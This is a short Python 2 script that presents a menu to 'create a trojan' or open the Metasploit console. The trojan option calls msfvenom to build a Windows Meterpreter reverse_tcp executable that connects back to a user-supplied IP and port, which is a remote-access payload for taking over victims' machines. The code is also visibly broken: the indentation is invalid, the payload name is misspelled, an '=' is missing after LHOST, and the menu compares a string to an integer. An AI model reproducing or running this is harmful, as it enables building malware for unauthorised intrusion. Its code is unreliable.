import os
os.system("clear")
banner="""
-------- 
        --------
                ---------
                          ------------
"""
print(banner)

print("""
1]create a trojan
2]open msf """)
girdi=raw_input("------->")
 
 if(girdi==1):

            ip=raw_input("ip <------>")
            port=raw_input("port <---->")
            ismin=raw_input("trojan name <------->")
            os.system("clear && msfvenom -p windows/metepreter/reverse_tcp  LHOST"+ip+" LPORT="+port+" -f exe -o "+ismin)
            
           if(girdi==2):
           os.system("msfconsole")
           
           
           
           

           
      